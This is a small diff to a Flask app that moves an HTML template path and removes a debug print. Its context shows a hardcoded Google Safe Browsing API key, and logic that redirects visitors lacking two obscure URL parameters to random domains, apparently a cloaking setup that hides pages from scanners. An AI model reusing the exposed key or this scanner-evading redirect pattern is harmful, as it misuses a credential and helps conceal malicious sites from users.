@@ -8,7 +8,7 @@ app = Flask(__name__)
 # Your Google Safe Browsing API key
 API_KEY = 'AIzaSyDyOPmvplb1WtijK21xb4ApvRZwCxtsA18'
 # Path to the raw HTML template
-RAW_HTML_FILE_PATH = 'raw.html'
+RAW_HTML_FILE_PATH = 'templates/raw.html'
 # Path to the final index HTML file
 INDEX_HTML_FILE_PATH = 'index.html'
 # Path to the file containing redirect URLs
@@ -87,7 +87,6 @@ def check_links_and_serve():
     # Retrieve 'trexxcoz' and 'coztrexx' parameters from URL
     ipv = request.args.get('wE657UyRfVtO')
     iav = request.args.get('VfDbGdT4R4ErD54tR1DtR')
-    print(f"Received ipv: {ipv}, iav: {iav}")  # For debugging
     if not ipv or not iav:
         # If parameters are missing, redirect to REDIRECT_URL
         random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
